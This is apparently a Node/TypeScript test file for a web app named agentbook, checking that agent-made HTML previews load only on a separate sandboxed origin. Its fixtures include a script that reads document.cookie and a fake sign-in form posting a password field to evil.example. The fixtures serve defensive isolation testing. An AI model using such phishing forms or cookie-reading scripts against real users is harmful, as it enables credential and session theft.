#!/usr/bin/env node
// Previews on their own origin: with AGENTBOOK_PREVIEW_URL, an agent's HTML
// is served only under that name, which serves nothing else, and the page's own name serves no previews. So a
// post's page can never be on the page's origin, even outside its sandbox.
// Run: node test/preview.ts

import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { spawnAgentbook, testPort } from "./harness.ts";

const HOME = fs.mkdtempSync(path.join(os.tmpdir(), "agentbook-preview-"));
const PORT = testPort(5800);
const URL = `http://127.0.0.1:${PORT}`;
const PREVIEW = `http://preview.localhost:${PORT}`;
const project = path.join(HOME, "dev", "site");
fs.mkdirSync(project, { recursive: true });
fs.writeFileSync(path.join(project, "page.html"), "<!doctype html><h1>A mockup</h1><script>document.title = document.cookie</script>");
fs.mkdirSync(path.join(HOME, "cli"), { recursive: true });
fs.writeFileSync(path.join(HOME, "cli", "gate.json"), JSON.stringify({ folders: [HOME] }));
const env = { ...process.env, AGENTBOOK_HOME: HOME, AGENTBOOK_PORT: String(PORT), AGENTBOOK_PREVIEW_URL: PREVIEW, AGENTBOOK_CODEX: "0", AGENTBOOK_OPENCLAW: "0", AGENTBOOK_HERMES: "0", AGENTBOOK_TERMINAL: "0", AGENTBOOK_CLAUDE: "/usr/bin/false", CLAUDE_CONFIG_DIR: path.join(HOME, "claude") };
for (const k of ["AGENTBOOK_PLUGIN_DIR", "AGENTBOOK_CHANNEL", "AGENTBOOK_HUB", "AGENTBOOK_URL", "AGENTBOOK_LAUNCH_ID", "AGENTBOOK_SERVER"]) delete env[k];

let failures = 0;
const check = (cond: unknown, label: string): void => {
  console.log(`${cond ? "PASS" : "FAIL"}  ${label}`);
  if (!cond) failures++;
};
const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));
// A request under a name of our choosing (fetch won't set Host), and what came back.
const get = (p: string, host = `127.0.0.1:${PORT}`, cookie = "") =>
  new Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }>((resolve, reject) => {
    http
      .get({ host: "127.0.0.1", port: PORT, path: p, headers: { host, ...(cookie ? { cookie } : {}) } }, (res) => {
        let body = "";
        res.on("data", (d) => (body += d));
        res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
      })
      .on("error", reject);
  });

const server = spawnAgentbook({ env, stdio: "ignore" });
try {
  for (let i = 0; i < 100 && !(await fetch(URL + "/api/health").catch(() => null))?.ok; i++) await sleep(100);
  const setup = await fetch(URL + "/api/auth/test-person", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ username: "tester" }) });
  const cookie = (setup.headers.get("set-cookie") || "").split(";")[0];
  await fetch(URL + "/api/hello", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ proc: "p1", label: "wren", agent: "Claude", session_id: "s1", cwd: project }) });

  const side = JSON.parse((await get("/api/q/side", undefined, cookie)).body);
  check(side.data?.preview === PREVIEW, "the page knows where previews are");
  const page = await get("/", undefined, cookie);
  check(page.headers["content-security-policy"]?.includes(`frame-src 'self' http://preview.localhost:${PORT}`), "and may frame them from there, and nowhere else but itself");

  const file = JSON.parse((await get("/api/sessions/s1/file?path=page.html", undefined, cookie)).body);
  check(file.kind === "html" && file.peek?.id, `a post's HTML comes back with a preview link (${JSON.stringify(file).slice(0, 120)})`);
  const at = `/api/peek/${file.peek.id}/${file.peek.path}`;
  const there = await get(at, `preview.localhost:${PORT}`);
  check(there.status === 200 && /A mockup/.test(there.body) && /sandbox/.test(String(there.headers["content-security-policy"] || "")), "it's served under the previews' name, sandboxed");
  check((await get(at)).status === 404, "and not under the page's own name");
  const back = await get("/api/github/app/installed?installation_id=7&setup_action=install", `preview.localhost:${PORT}`);
  check(back.status === 302 && back.headers.location === `${URL}/api/github/app/installed?installation_id=7&setup_action=install`, `GitHub's way back, from an app made under the previews' name, goes on to the page's name (${back.status} ${back.headers.location || ""})`);
  check((await get("/api/q/side", `preview.localhost:${PORT}`, cookie)).status === 404 && (await get("/", `preview.localhost:${PORT}`)).status === 404, "the previews' name serves nothing else: not the page, not its API");

  // An agent's HTML file on a thread opens under the previews' name too, by a link that needs no sign-in: under the
  // page's own name, a page made to look like agentbook's sign-in would sit under agentbook's address.
  const up = await fetch(URL + "/api/upload?draft=1&name=signin.html", { method: "POST", headers: { cookie, "content-type": "application/octet-stream" }, body: "<!doctype html><form action=https://evil.example method=post><input name=pw></form>" });
  const fid = ((await up.json()) as { id: string }).id;
  const main = await get(`/api/files/${fid}`, undefined, cookie);
  check(up.status === 200 && main.status === 302 && (main.headers.location || "").startsWith(`${PREVIEW}/api/files/${fid}?t=`), `the page's name sends an HTML file to the previews' name (${up.status} ${main.status} ${main.headers.location || ""})`);
  const link = new globalThis.URL(main.headers.location || PREVIEW);
  const served = await get(link.pathname + link.search, `preview.localhost:${PORT}`);
  check(served.status === 200 && /text\/html/.test(served.headers["content-type"] || "") && /sandbox/.test(String(served.headers["content-security-policy"] || "")) && /evil\.example/.test(served.body), `where it opens without a sign-in, sandboxed (${served.status} ${served.headers["content-type"]})`);
  check((await get(`/api/files/${fid}?t=nope`, `preview.localhost:${PORT}`)).status === 404 && (await get(`/api/files/${fid}`, `preview.localhost:${PORT}`, cookie)).status === 404, "and only by its link: not with a wrong one, not with a sign-in");
  const down = await get(`/api/files/${fid}?download=1`, undefined, cookie);
  check(down.status === 200 && /attachment/.test(down.headers["content-disposition"] || ""), "downloading it stays on the page's name");
} catch (e) {
  check(false, `test crashed: ${e.stack}`);
} finally {
  server.kill();
  fs.rmSync(HOME, { recursive: true, force: true });
}
console.log(failures ? `\n${failures} failed` : "\nall passed");
process.exit(failures ? 1 : 0);
